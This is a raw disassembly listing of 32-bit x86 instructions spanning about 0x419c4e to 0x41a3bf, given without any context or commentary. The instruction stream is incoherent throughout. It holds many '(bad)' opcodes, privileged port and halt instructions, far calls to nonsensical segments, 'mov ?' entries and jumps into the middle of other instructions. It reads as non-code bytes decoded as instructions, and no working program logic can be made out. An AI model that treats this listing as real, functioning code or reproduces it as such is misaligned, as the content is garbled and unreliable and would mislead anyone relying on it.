  419c4e:	cli    
  419c4f:	or     DWORD PTR [edx+0x362a6d93],0xb60bb979
  419c59:	jl     0x419cb7
  419c5b:	gs stos BYTE PTR es:[edi],al
  419c5d:	jo     0x419bfa
  419c5f:	bnd ret 
  419c61:	push   eax
  419c62:	cmp    al,0xd3
  419c64:	sbb    DWORD PTR [edx+0x24],ebx
  419c67:	adc    al,0x14
  419c69:	or     eax,0x2ab6f88
  419c6e:	outs   dx,BYTE PTR ds:[esi]
  419c6f:	xor    eax,0xe6f4ab57
  419c74:	sbb    esp,edx
  419c76:	int3   
  419c77:	imul   eax,DWORD PTR [edx+0xc20c4c5],0x6d
  419c7e:	bound  ebx,QWORD PTR [ebp-0x34e1c930]
  419c84:	call   0xad81:0xf07a1d47
  419c8b:	stc    
  419c8c:	pop    edx
  419c8d:	in     eax,dx
  419c8e:	mov    al,0xa9
  419c90:	push   ecx
  419c91:	arpl   WORD PTR [ecx-0x2d],bp
  419c94:	scas   al,BYTE PTR es:[edi]
  419c95:	jmp    0x419c6c
  419c97:	pop    ecx
  419c98:	and    dh,bl
  419c9a:	out    0x71,eax
  419c9c:	dec    edi
  419c9d:	push   0x55ccf796
  419ca2:	cmp    bh,ah
  419ca4:	call   0xca13:0x5470f6c8
  419cab:	sub    edx,DWORD PTR [ecx-0x32]
  419cae:	(bad)  
  419caf:	ja     0x419c42
  419cb1:	icebp  
  419cb2:	int    0x20
  419cb4:	retf   
  419cb5:	cmp    DWORD PTR [ebp+0x3bc879e8],edx
  419cbb:	fbstp  TBYTE PTR [eax-0x94da24a]
  419cc1:	cld    
  419cc2:	cmp    al,BYTE PTR [ecx+esi*2-0x5d246639]
  419cc9:	cmp    eax,0x720224d0
  419cce:	mov    dl,0xee
  419cd0:	xlat   BYTE PTR ds:[ebx]
  419cd1:	loop   0x419c94
  419cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cd4:	jne    0x419c73
  419cd6:	and    al,0xc1
  419cd8:	xor    eax,0xa6050122
  419cdd:	inc    edi
  419cde:	jmp    0x52113d39
  419ce3:	test   al,0x5e
  419ce5:	push   esi
  419ce6:	mov    dl,0x3e
  419ce8:	shr    dh,cl
  419cea:	push   edx
  419ceb:	div    BYTE PTR [ecx+0x78c8df14]
  419cf1:	xor    DWORD PTR [ecx-0x1c6ee6b5],0x943773fb
  419cfb:	nop
  419cfc:	sbb    DWORD PTR [edx+0x4d76b4],eax
  419d02:	or     eax,0xb262ff32
  419d07:	cdq    
  419d08:	mov    BYTE PTR [esi],0xe9
  419d0b:	rol    BYTE PTR [esi+0x6317a3b8],0x82
  419d12:	idiv   DWORD PTR ds:0xbfdc4760
  419d18:	ret    0x4dd0
  419d1b:	out    dx,al
  419d1c:	ja     0x419d55
  419d1e:	add    dl,dh
  419d20:	cli    
  419d21:	fcom   DWORD PTR [ebp+0x74baa514]
  419d27:	adc    ebx,DWORD PTR [edx]
  419d29:	push   eax
  419d2a:	stos   BYTE PTR es:[edi],al
  419d2b:	mov    edx,0x2c5d4d28
  419d30:	adc    DWORD PTR ds:0xd36fb8a6,eax
  419d36:	mov    esi,0xada57445
  419d3b:	add    eax,DWORD PTR [ebx]
  419d3d:	sub    DWORD PTR [esi-0x1],0x74
  419d41:	loopne 0x419d42
  419d43:	sbb    edi,esi
  419d45:	sub    BYTE PTR ds:0x96f1315f,bh
  419d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d4c:	mov    ebp,0x9a30dc94
  419d51:	pusha  
  419d52:	fcomp  DWORD PTR [esi+0x25]
  419d55:	cdq    
  419d56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d57:	stos   BYTE PTR es:[edi],al
  419d58:	rcl    BYTE PTR [edx+edi*2-0x3],cl
  419d5c:	enter  0xdfa6,0xcf
  419d60:	pop    es
  419d61:	push   edi
  419d62:	hlt    
  419d63:	nop
  419d64:	je     0x419d3f
  419d66:	adc    al,0xb8
  419d68:	jg     0x419da3
  419d6a:	xchg   esp,eax
  419d6b:	fnstcw WORD PTR [ebx+0x67]
  419d6e:	ja     0x419d6d
  419d70:	cmp    BYTE PTR [eax],al
  419d72:	sbb    DWORD PTR [ecx-0x33],0x9851038a
  419d79:	xchg   edx,eax
  419d7a:	xchg   esi,eax
  419d7b:	es mov ch,0x17
  419d7e:	mov    ecx,0xd6b3a043
  419d83:	daa    
  419d84:	xor    edx,DWORD PTR [edi*2+0x71e00d94]
  419d8b:	dec    esi
  419d8c:	push   ds
  419d8d:	and    BYTE PTR [edx+0x9c71d6c],bh
  419d93:	out    0xf6,al
  419d95:	loope  0x419dd8
  419d97:	push   ebp
  419d98:	xchg   ebp,eax
  419d99:	int3   
  419d9a:	enter  0x4e72,0x2e
  419d9e:	in     al,dx
  419d9f:	adc    ebx,DWORD PTR [ecx]
  419da1:	adc    BYTE PTR [eax],0x61
  419da4:	mov    al,ds:0xd827bfa9
  419da9:	adc    al,0xa4
  419dab:	mov    ebp,0xa16b4dea
  419db0:	add    eax,0xd77f555b
  419db5:	jae    0x419df9
  419db7:	fnstsw WORD PTR [eax]
  419db9:	jg     0x419d82
  419dbb:	push   0x2e
  419dbd:	out    0x4e,al
  419dbf:	aas    
  419dc0:	sub    eax,0xc9117909
  419dc5:	and    esi,DWORD PTR [edx]
  419dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dc8:	sub    eax,0x1297b1b0
  419dcd:	mov    BYTE PTR ss:[ecx+eax*2+0x22d5b560],0xec
  419dd6:	jb     0x419e01
  419dd8:	fsqrt  
  419dda:	ins    BYTE PTR es:[edi],dx
  419ddb:	out    0x21,al
  419ddd:	bound  ecx,QWORD PTR [esi]
  419ddf:	loope  0x419e5e
  419de1:	int    0x7c
  419de3:	(bad)  [edi+0x5fa8cc7d]
  419de9:	scas   al,BYTE PTR es:[edi]
  419dea:	or     ecx,DWORD PTR [ebx+0x5f]
  419ded:	stos   BYTE PTR es:[edi],al
  419dee:	(bad)  
  419def:	sub    al,ch
  419df1:	jmp    0x9bcee46b
  419df6:	clc    
  419df7:	dec    eax
  419df8:	push   ebx
  419df9:	dec    eax
  419dfa:	adc    BYTE PTR [esi-0x2e7193ce],dh
  419e00:	push   edi
  419e01:	pusha  
  419e02:	fst    DWORD PTR [edx+0x51fc99ba]
  419e08:	(bad)  
  419e09:	out    0x63,eax
  419e0b:	pushf  
  419e0c:	mov    ds:0x97ba3d88,eax
  419e11:	push   0xf2e74d98
  419e16:	mov    ds:0x14057868,al
  419e1b:	or     dl,ah
  419e1d:	lock ret 0xb67e
  419e21:	pop    ebp
  419e22:	cmp    ch,al
  419e24:	popf   
  419e25:	push   ecx
  419e26:	sbb    al,0x19
  419e28:	mov    dl,0x8c
  419e2a:	aas    
  419e2b:	or     BYTE PTR [esi],dl
  419e2d:	xchg   esi,eax
  419e2e:	test   BYTE PTR es:[ecx],bl
  419e31:	cmp    eax,0x93ddd613
  419e36:	pop    ecx
  419e37:	xor    al,BYTE PTR [ebx]
  419e39:	add    al,0xb5
  419e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e3c:	jmp    FWORD PTR [edi-0x7a]
  419e3f:	or     al,0xb0
  419e41:	mov    gs,WORD PTR [edx+0x1d]
  419e44:	rcr    BYTE PTR [eax],1
  419e46:	jecxz  0x419e87
  419e48:	cmp    DWORD PTR [esi-0x6a0d4ba7],eax
  419e4e:	js     0x419e43
  419e50:	jle    0x419e1b
  419e52:	repz mov eax,0x989e82c0
  419e58:	rol    DWORD PTR [ebx-0x56],0x15
  419e5c:	pop    ebx
  419e5d:	mov    cl,BYTE PTR [eax-0x37b77d13]
  419e63:	clc    
  419e64:	pushf  
  419e65:	retf   0xb23d
  419e68:	xor    BYTE PTR [edi],ah
  419e6a:	call   0xaa028478
  419e6f:	mov    esp,0x669d57a2
  419e74:	outs   dx,BYTE PTR ds:[esi]
  419e75:	out    0x36,al
  419e77:	pushf  
  419e78:	add    ebp,esi
  419e7a:	push   DWORD PTR [edi]
  419e7c:	fdivr  DWORD PTR [eax+0x67]
  419e7f:	aam    0xbf
  419e81:	ror    edi,1
  419e83:	(bad)  
  419e84:	and    al,0x8d
  419e86:	pushw  es
  419e88:	dec    esp
  419e89:	push   es
  419e8a:	out    0x0,al
  419e8c:	retf   
  419e8d:	ins    BYTE PTR es:[edi],dx
  419e8e:	pop    ebp
  419e8f:	pop    ecx
  419e90:	or     al,0x45
  419e92:	xor    al,0x27
  419e94:	xchg   esi,eax
  419e95:	pop    ebp
  419e96:	sub    al,0x9e
  419e98:	add    BYTE PTR [edx+0xcc5498a],ah
  419e9e:	aam    0x75
  419ea0:	sub    dl,ah
  419ea2:	int    0x18
  419ea4:	jmp    0xde49:0x733fe1bb
  419eab:	shl    ecx,0x2f
  419eae:	ret    0xad4e
  419eb1:	iret   
  419eb2:	stc    
  419eb3:	cmp    edi,DWORD PTR [ecx-0x1]
  419eb6:	cli    
  419eb7:	inc    edi
  419eb8:	adc    BYTE PTR [ebx+0x34a66984],0x6b
  419ebf:	mov    ebp,0x950cd0de
  419ec4:	(bad)  
  419ec5:	cdq    
  419ec6:	aam    0xf5
  419ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ec9:	adc    BYTE PTR [ebp-0x14],ch
  419ecc:	adc    eax,0x2cd6a80a
  419ed1:	sbb    al,0x3b
  419ed3:	mov    bl,0x3c
  419ed5:	mov    al,ds:0x793645a0
  419eda:	jecxz  0x419ecf
  419edc:	dec    eax
  419edd:	les    ecx,FWORD PTR [esi]
  419edf:	dec    esp
  419ee0:	dec    esp
  419ee1:	(bad)
  419ee5:	mov    bl,0xf6
  419ee7:	pop    esp
  419ee8:	(bad)  
  419eea:	mov    esi,0x567d62c
  419eef:	inc    edi
  419ef0:	out    0x78,al
  419ef2:	mov    al,ds:0x7f23ad0
  419ef7:	(bad)  
  419ef8:	pop    esi
  419ef9:	retf   
  419efa:	(bad)  
  419efb:	cmp    eax,0x6da9e14c
  419f00:	jmp    0xabf1c41a
  419f05:	cdq    
  419f06:	cld    
  419f07:	dec    edx
  419f08:	jae    0x419f55
  419f0a:	jns    0x419eef
  419f0c:	jl     0x419f1d
  419f0e:	xor    dh,BYTE PTR [esi+0x5d]
  419f11:	lahf   
  419f12:	pop    eax
  419f13:	aad    0x12
  419f15:	hlt    
  419f16:	xlat   BYTE PTR ds:[ebx]
  419f18:	sbb    al,0x6e
  419f1a:	inc    edi
  419f1b:	mov    ch,0x81
  419f1d:	push   esi
  419f1e:	xchg   ebp,eax
  419f1f:	js     0x419f33
  419f21:	xchg   DWORD PTR [ebp+0x59b06d29],ecx
  419f27:	push   edi
  419f28:	fwait
  419f29:	mov    esp,0x2f966bed
  419f2e:	pop    esp
  419f2f:	mov    ss,WORD PTR [edi-0x59fdee04]
  419f35:	jne    0x419fb0
  419f37:	xor    al,0x54
  419f39:	jbe    0x419f6e
  419f3b:	xor    esi,esp
  419f3d:	add    al,0xb8
  419f3f:	pop    esp
  419f40:	adc    esp,DWORD PTR [edx]
  419f42:	or     ecx,DWORD PTR [ebp-0x71]
  419f45:	pop    edi
  419f46:	adc    BYTE PTR [eax],ch
  419f48:	adc    BYTE PTR [edx-0x37],al
  419f4b:	jns    0x419f9c
  419f4d:	push   edx
  419f4e:	ja     0x419f4f
  419f50:	inc    bh
  419f52:	(bad)  
  419f53:	out    dx,al
  419f54:	or     bh,BYTE PTR [ebx+0x4f]
  419f57:	push   edi
  419f58:	sbb    cl,BYTE PTR [ecx-0x2db7444f]
  419f5e:	lock pop ss
  419f60:	and    al,0x2c
  419f62:	jo     0x419f81
  419f64:	sub    al,0xc3
  419f66:	adc    DWORD PTR [esi-0x3a92b2d4],0xffffff88
  419f6d:	push   ebx
  419f6e:	sbb    al,0x99
  419f70:	jp     0x419f57
  419f72:	loop   0x419fc7
  419f74:	sbb    ch,dl
  419f76:	xchg   edi,eax
  419f77:	mov    ds:0xd2d688a3,eax
  419f7c:	xor    ah,BYTE PTR [esi]
  419f7e:	xchg   ecx,eax
  419f7f:	into   
  419f80:	or     eax,DWORD PTR [esi-0x39771485]
  419f86:	sahf   
  419f87:	mov    dl,BYTE PTR [ebp-0x1c3bd2cf]
  419f8d:	xchg   edi,eax
  419f8e:	jne    0x419f6e
  419f90:	mov    ?,eax
  419f92:	test   al,0x7f
  419f94:	fwait
  419f95:	loope  0x419fdd
  419f97:	sbb    ebx,ecx
  419f99:	addr16 aaa 
  419f9b:	cli    
  419f9c:	cld    
  419f9d:	ror    bh,0xbb
  419fa0:	xchg   BYTE PTR [ebx-0x2c702cda],ah
  419fa6:	dec    ebp
  419fa7:	adc    edx,DWORD PTR [esi+eiz*4]
  419faa:	add    eax,0x4e3c9a5
  419faf:	(bad)  
  419fb0:	leave  
  419fb1:	lea    edx,[edx+0x38ea56a7]
  419fb7:	jecxz  0x41a028
  419fb9:	gs aam 0x1a
  419fbc:	jge    0x41a006
  419fbe:	loopne 0x419fc2
  419fc0:	(bad)  
  419fc1:	adc    BYTE PTR [eax+0x6bae91e1],dh
  419fc7:	or     BYTE PTR [ebx-0x61],cl
  419fca:	sub    bh,BYTE PTR [ebx]
  419fcc:	rcl    ch,0xc9
  419fcf:	xor    ah,BYTE PTR [edx-0x1d]
  419fd2:	add    ebp,edi
  419fd4:	inc    esi
  419fd5:	sbb    BYTE PTR [eax],0x17
  419fd8:	sbb    eax,esi
  419fda:	sbb    BYTE PTR [edi+0x756e332c],bl
  419fe0:	stos   BYTE PTR es:[edi],al
  419fe1:	xor    ch,dh
  419fe3:	cld    
  419fe4:	sbb    eax,0xc84e36f5
  419fe9:	jmp    0x241b8a5c
  419fee:	inc    ebp
  419fef:	push   0xffffffd3
  419ff1:	lods   eax,DWORD PTR ds:[esi]
  419ff2:	sahf   
  419ff3:	popa   
  419ff4:	push   ecx
  419ff5:	fild   QWORD PTR [ebx+0x7982d343]
  419ffb:	inc    ebp
  419ffc:	pop    ecx
  419ffd:	pop    esi
  419ffe:	add    BYTE PTR [ebp+ecx*2-0x5d597814],cl
  41a005:	leave  
  41a006:	jmp    0x38f7534b
  41a00b:	jl     0x41a078
  41a00d:	mov    eax,0x11a7cd03
  41a012:	dec    edx
  41a013:	add    edx,DWORD PTR [edi+0x3c8b35ce]
  41a019:	ret    0xb2e7
  41a01c:	mov    ch,0x72
  41a01e:	or     BYTE PTR [ecx],ch
  41a020:	out    dx,al
  41a021:	lock or BYTE PTR [ebx+esi*1-0x5929e48c],0x71
  41a02a:	xchg   esp,eax
  41a02b:	and    eax,DWORD PTR [ecx+0x7295f556]
  41a031:	jmp    0x419fdc
  41a033:	adc    BYTE PTR [edi-0x23],0x7f
  41a037:	sbb    eax,0x2afb11c2
  41a03c:	jg     0x41a054
  41a03e:	pop    es
  41a03f:	shr    bh,1
  41a041:	addr16 sub edi,edi
  41a044:	fidiv  DWORD PTR [ebp+0x3308cc67]
  41a04a:	cmp    DWORD PTR [ecx],esp
  41a04c:	sar    BYTE PTR [esi-0x3c28da21],1
  41a052:	test   eax,0xe98dc54a
  41a057:	out    0x93,eax
  41a059:	xor    al,0x39
  41a05b:	fst    QWORD PTR [esi+0x73edc245]
  41a061:	jl     0x41a022
  41a063:	mov    edx,0xac4ab82d
  41a068:	pop    esi
  41a069:	add    esp,DWORD PTR [edx+0x2c42eeae]
  41a06f:	mov    ds:0xed31a70b,eax
  41a074:	popa   
  41a075:	push   ds
  41a076:	in     eax,dx
  41a077:	imul   ecx,DWORD PTR [edx+0x59],0x2de3be4d
  41a07e:	(bad)  [ecx+0x93cf21b]
  41a084:	mov    al,0xa9
  41a086:	fst    QWORD PTR [ecx+0x24a17b92]
  41a08c:	pusha  
  41a08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a08e:	inc    ebx
  41a08f:	enter  0xc9,0xf3
  41a093:	mov    esi,0xb5bcce99
  41a098:	dec    esp
  41a099:	cdq    
  41a09a:	test   DWORD PTR [esi+edi*1+0x37],ecx
  41a09e:	ins    BYTE PTR es:[edi],dx
  41a09f:	sbb    ebx,DWORD PTR [ecx-0x524add49]
  41a0a5:	xchg   ebx,eax
  41a0a6:	mov    WORD PTR [edx],ss
  41a0a8:	fwait
  41a0a9:	xor    eax,0xa8b4d1c0
  41a0ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0af:	(bad)  
  41a0b0:	aam    0xa4
  41a0b2:	push   0x591b9ba7
  41a0b7:	dec    ebx
  41a0b8:	jns    0x41a07a
  41a0ba:	jne    0x41a115
  41a0bc:	inc    ebx
  41a0bd:	inc    ebp
  41a0be:	add    eax,0x13945d0d
  41a0c3:	dec    si
  41a0c5:	cmp    BYTE PTR [ecx],0x91
  41a0c8:	lods   al,BYTE PTR ds:[esi]
  41a0c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0ca:	add    ch,BYTE PTR [edx-0x44]
  41a0cd:	stc    
  41a0ce:	jbe    0x41a0df
  41a0d0:	aam    0x1c
  41a0d2:	mov    ds:0x62f7c1ee,eax
  41a0d7:	jno    0x41a061
  41a0d9:	or     BYTE PTR ds:0xc4fe13ef,0xc3
  41a0e0:	lock ja 0x41a069
  41a0e3:	pushf  
  41a0e4:	jae    0x41a13d
  41a0e6:	jne    0x41a156
  41a0e8:	xor    edi,DWORD PTR [eax]
  41a0ea:	loope  0x41a0ab
  41a0ec:	inc    ebp
  41a0ed:	mov    al,ds:0x881d03b1
  41a0f2:	jecxz  0x41a11d
  41a0f4:	out    dx,eax
  41a0f5:	pop    ecx
  41a0f6:	std    
  41a0f7:	popf   
  41a0f8:	into   
  41a0f9:	ret    0x2bfe
  41a0fc:	dec    eax
  41a0fd:	push   ds
  41a0fe:	sub    edx,DWORD PTR [edi]
  41a100:	sbb    DWORD PTR [edx+0x1e],edi
  41a103:	lods   al,BYTE PTR ds:[esi]
  41a104:	mov    ecx,0x235759e9
  41a109:	sub    al,BYTE PTR [eax+eax*4-0x3a]
  41a10d:	aas    
  41a10e:	fisttp QWORD PTR [esp+ecx*2]
  41a111:	(bad)  
  41a112:	cmc    
  41a113:	jp     0x41a118
  41a115:	nop
  41a116:	fistp  QWORD PTR ds:0xc2332365
  41a11c:	adc    dh,BYTE PTR [edx-0x1691e043]
  41a122:	inc    ecx
  41a123:	jecxz  0x41a11d
  41a125:	arpl   WORD PTR [ebx-0x67],bx
  41a128:	mov    edx,0xb5edf3f6
  41a12d:	inc    ecx
  41a12e:	in     al,0x46
  41a130:	outs   dx,DWORD PTR ds:[esi]
  41a131:	push   ds
  41a132:	pop    ebx
  41a133:	loop   0x41a158
  41a135:	into   
  41a136:	dec    ebx
  41a137:	mov    ss,WORD PTR [esi+ebp*1+0x67c1f296]
  41a13e:	inc    esp
  41a13f:	dec    ebx
  41a140:	repz xor al,0xd4
  41a143:	les    edi,FWORD PTR [edi]
  41a145:	add    dl,BYTE PTR fs:[ebp-0x2c]
  41a149:	sub    bl,BYTE PTR [ebx+edx*4]
  41a14c:	adc    BYTE PTR [ebp+0x4bbf17f],cl
  41a152:	rcl    BYTE PTR [esi-0x42],cl
  41a155:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a157:	dec    eax
  41a158:	fldenv [eax]
  41a15a:	(bad)  
  41a15b:	hlt    
  41a15c:	pop    es
  41a15d:	cmp    BYTE PTR [esi],0xbc
  41a160:	jp     0x41a119
  41a162:	jns    0x41a187
  41a164:	in     eax,dx
  41a165:	sub    al,0x6c
  41a167:	int    0x66
  41a169:	test   ebx,0xd4db45d3
  41a16f:	jmp    0x41a14c
  41a171:	les    edi,FWORD PTR [esi-0x45573b4d]
  41a177:	icebp  
  41a178:	mov    al,0x8e
  41a17a:	and    eax,0x78f2f565
  41a17f:	imul   ecx,edi,0xffffffb1
  41a182:	daa    
  41a183:	or     BYTE PTR [esi],dl
  41a185:	inc    edi
  41a186:	scas   eax,DWORD PTR es:[edi]
  41a187:	mov    al,0xfe
  41a189:	dec    esi
  41a18a:	or     al,0xe3
  41a18c:	jnp    0x41a17d
  41a18e:	adc    eax,0xa81c1f4b
  41a193:	xchg   ebx,eax
  41a194:	mov    BYTE PTR [ecx],dh
  41a196:	xchg   ecx,eax
  41a197:	cmp    bh,BYTE PTR [edi]
  41a199:	(bad)  
  41a19a:	ins    BYTE PTR es:[edi],dx
  41a19b:	or     DWORD PTR [ebx-0x70],edx
  41a19e:	arpl   WORD PTR [ecx],bx
  41a1a0:	inc    edi
  41a1a1:	shl    BYTE PTR [ebp-0x68331997],1
  41a1a7:	cmp    BYTE PTR [edi-0x4adbcc68],dl
  41a1ad:	into   
  41a1ae:	xor    BYTE PTR [ebp+0x4],ah
  41a1b1:	jl     0x41a145
  41a1b3:	outs   dx,BYTE PTR ds:[esi]
  41a1b4:	rep outs dx,BYTE PTR ds:[esi]
  41a1b6:	mov    dl,0x91
  41a1b8:	mov    bh,0x67
  41a1ba:	or     eax,0x36594b0a
  41a1bf:	aad    0xd8
  41a1c1:	mov    esp,0x338b5ddd
  41a1c6:	mov    ds:0x4983219a,al
  41a1cb:	sbb    al,0x8d
  41a1cd:	cmp    DWORD PTR [esi],edi
  41a1cf:	pop    edi
  41a1d0:	push   edi
  41a1d1:	or     DWORD PTR [edx+0x23],edi
  41a1d4:	push   0xffffffc7
  41a1d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1d7:	ins    DWORD PTR es:[edi],dx
  41a1d8:	int3   
  41a1d9:	aad    0x1c
  41a1db:	or     esp,edx
  41a1dd:	nop
  41a1de:	mov    esp,0xb233982
  41a1e3:	mov    eax,ds:0x8691c95d
  41a1e8:	lahf   
  41a1e9:	xchg   ebp,eax
  41a1ea:	ja     0x41a203
  41a1ec:	mov    ecx,0xb82a0ba2
  41a1f1:	push   ds
  41a1f2:	xor    DWORD PTR [esi+0x32],eax
  41a1f5:	mov    dl,0xc8
  41a1f7:	xchg   edi,eax
  41a1f8:	mov    ?,esi
  41a1fa:	loopne 0x41a222
  41a1fc:	xchg   ebp,eax
  41a1fd:	push   edi
  41a1fe:	cwde   
  41a1ff:	pop    di
  41a201:	ret    
  41a202:	(bad)  
  41a203:	and    al,BYTE PTR [ecx]
  41a205:	push   ebx
  41a206:	jae    0x41a1c3
  41a208:	call   0xfd47deb6
  41a20d:	out    dx,al
  41a20e:	jnp    0x41a1c7
  41a210:	ret    
  41a211:	mov    esi,0x875c538d
  41a216:	rcl    DWORD PTR ss:[ebx-0x15c89fba],cl
  41a21d:	outs   dx,BYTE PTR ds:[esi]
  41a21e:	jge    0x41a27d
  41a220:	data16 jl 0x41a1bf
  41a223:	jle    0x41a1f9
  41a225:	in     al,0x15
  41a227:	add    BYTE PTR [eax+0x24742c34],bl
  41a22d:	jg     0x41a1e1
  41a22f:	sbb    eax,0x67c092dc
  41a234:	div    BYTE PTR [esi-0x60]
  41a237:	xor    eax,0x3de72a24
  41a23c:	not    DWORD PTR [edx]
  41a23e:	sahf   
  41a23f:	jb     0x41a276
  41a241:	ja     0x41a1fd
  41a243:	test   eax,0x531737cd
  41a248:	stos   DWORD PTR es:[edi],eax
  41a249:	mov    eax,0xe93b9d0f
  41a24e:	imul   edi,DWORD PTR [edi],0xffffffa0
  41a251:	push   0xb2070e3b
  41a256:	stos   BYTE PTR es:[edi],al
  41a257:	das    
  41a258:	jb     0x41a1fd
  41a25a:	out    dx,al
  41a25b:	retf   0xfc06
  41a25e:	(bad)  
  41a25f:	cs aad 0x7b
  41a262:	sub    al,0xee
  41a264:	xor    eax,0xd3f1bd97
  41a269:	imul   edi,DWORD PTR [eax+0x50],0x79caba9f
  41a270:	push   edx
  41a271:	lea    edi,[edi+0x7999a30d]
  41a277:	inc    ecx
  41a278:	inc    edx
  41a279:	dec    ebp
  41a27a:	adc    eax,ebp
  41a27c:	inc    ax
  41a27e:	lahf   
  41a27f:	daa    
  41a280:	sbb    DWORD PTR [edx+0x73],edx
  41a283:	push   ebx
  41a284:	push   esp
  41a285:	clc    
  41a286:	xor    BYTE PTR [esp+edx*2+0x7f],ch
  41a28a:	add    bl,dh
  41a28c:	cmp    al,0x56
  41a28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a28f:	clc    
  41a290:	jmp    0xd39ae21d
  41a295:	dec    edi
  41a296:	sbb    eax,0x6d3c25a6
  41a29b:	pop    edx
  41a29c:	or     ch,bh
  41a29e:	mov    cl,0x76
  41a2a0:	cmp    esp,DWORD PTR ds:[edi+ebp*1]
  41a2a4:	lds    esi,FWORD PTR [esi-0x35]
  41a2a7:	xchg   ebp,eax
  41a2a8:	test   ebx,esp
  41a2aa:	xchg   esi,eax
  41a2ab:	mov    eax,ds:0xcbb1079d
  41a2b0:	add    eax,0xb34c93dc
  41a2b5:	push   es
  41a2b6:	fmul   QWORD PTR [esi+eax*2-0x3bd4097f]
  41a2bd:	and    ecx,ebp
  41a2bf:	lahf   
  41a2c0:	pop    edi
  41a2c1:	fidiv  DWORD PTR [edi]
  41a2c3:	push   edi
  41a2c4:	jno    0x41a257
  41a2c6:	in     al,dx
  41a2c7:	fist   DWORD PTR [esi+0x58]
  41a2ca:	ins    BYTE PTR es:[edi],dx
  41a2cb:	stos   DWORD PTR es:[edi],eax
  41a2cc:	ror    BYTE PTR [edx-0x8],0x75
  41a2d0:	jae    0x41a34a
  41a2d2:	fild   QWORD PTR [ecx]
  41a2d4:	xor    ecx,ebp
  41a2d6:	outs   dx,DWORD PTR ds:[esi]
  41a2d7:	ret    
  41a2d8:	dec    eax
  41a2d9:	adc    ch,BYTE PTR [ebp+eiz*2-0x1]
  41a2dd:	cmp    DWORD PTR [edx],esp
  41a2df:	cmp    edi,edx
  41a2e1:	pusha  
  41a2e2:	push   ss
  41a2e3:	push   eax
  41a2e4:	fidivr DWORD PTR [ebx+0x67]
  41a2e7:	cmovb  eax,DWORD PTR [eax+0x78]
  41a2eb:	test   al,0xb5
  41a2ed:	mov    cl,0x8a
  41a2ef:	dec    ecx
  41a2f0:	(bad)  
  41a2f1:	popf   
  41a2f2:	lds    esi,FWORD PTR ds:0x2502ffbb
  41a2f8:	mov    edi,gs
  41a2fa:	lock jb 0x41a33a
  41a2fd:	pop    esi
  41a2fe:	inc    eax
  41a2ff:	inc    ecx
  41a300:	mov    cl,0x2
  41a302:	jbe    0x41a2f4
  41a304:	hlt    
  41a305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a306:	jg     0x41a361
  41a308:	into   
  41a309:	pop    edi
  41a30a:	ins    DWORD PTR es:[edi],dx
  41a30b:	clc    
  41a30c:	add    DWORD PTR [ecx-0x3f],esp
  41a30f:	ins    DWORD PTR es:[edi],dx
  41a310:	out    0x1f,al
  41a312:	stos   BYTE PTR es:[edi],al
  41a313:	jge    0x41a2b1
  41a315:	scas   al,BYTE PTR es:[edi]
  41a316:	inc    ecx
  41a317:	(bad)  
  41a318:	rcl    dl,0x2f
  41a31b:	jg     0x41a366
  41a31d:	jnp    0x41a337
  41a31f:	inc    ah
  41a321:	inc    ebp
  41a322:	jo     0x41a397
  41a324:	cmp    eax,0xd08d0f0b
  41a329:	add    edx,esp
  41a32b:	mov    bl,BYTE PTR [edx]
  41a32d:	fcom   QWORD PTR cs:[ebx]
  41a330:	xchg   DWORD PTR [edx-0x15],ebp
  41a333:	mov    ecx,0x28f47aa8
  41a338:	mov    esp,0xfa3d24d7
  41a33d:	jg     0x41a368
  41a33f:	push   esi
  41a340:	aad    0x57
  41a342:	pop    ecx
  41a343:	push   esp
  41a344:	mov    edi,esi
  41a346:	cmp    al,0x89
  41a348:	hlt    
  41a349:	fmulp  st(6),st
  41a34b:	stos   DWORD PTR es:[edi],eax
  41a34c:	xlat   BYTE PTR ds:[ebx]
  41a34d:	scas   al,BYTE PTR es:[edi]
  41a34e:	and    BYTE PTR [edi-0x37],al
  41a351:	and    al,0x5b
  41a353:	retf   
  41a354:	jmp    ebp
  41a356:	adc    dh,BYTE PTR [ecx+ecx*4-0x6e92e83]
  41a35d:	inc    ecx
  41a35e:	mov    dh,0xfa
  41a360:	push   ebx
  41a361:	push   cs
  41a362:	mov    esi,ecx
  41a364:	and    BYTE PTR [esp+ebx*2+0x7],dh
  41a368:	jb     0x41a3e9
  41a36a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a36b:	mov    al,ds:0x6e868e7c
  41a370:	mov    edx,0xcceb7f4f
  41a375:	mov    ah,0x32
  41a377:	hlt    
  41a378:	(bad)  
  41a37a:	push   es
  41a37b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a37c:	add    edi,DWORD PTR [edx+ebx*2-0x49875e65]
  41a383:	adc    ecx,DWORD PTR [ebp-0x5a]
  41a386:	ins    BYTE PTR es:[edi],dx
  41a387:	xchg   ch,ch
  41a389:	test   DWORD PTR [esi-0x41],edx
  41a38c:	mov    esi,DWORD PTR [edx]
  41a38e:	je     0x41a352
  41a390:	push   ss
  41a391:	add    ch,dh
  41a393:	dec    esp
  41a394:	loopne 0x41a3dc
  41a396:	ins    DWORD PTR es:[edi],dx
  41a397:	(bad)  
  41a399:	or     cx,WORD PTR [ecx]
  41a39c:	mov    es,WORD PTR [ebx+0x9]
  41a39f:	mov    ecx,0xb0e98a92
  41a3a4:	push   edx
  41a3a5:	mov    ds:0xf97bd329,al
  41a3aa:	push   ebx
  41a3ab:	xchg   ebx,eax
  41a3ac:	xor    bl,BYTE PTR [ebp-0x753e6b6f]
  41a3b2:	sbb    BYTE PTR [ebx+0x5c6c8610],dh
  41a3b8:	fdivp  st(0),st
  41a3ba:	call   0x1c345346
  41a3bf:	arpl   WORD PTR [esi-0x5a],cx
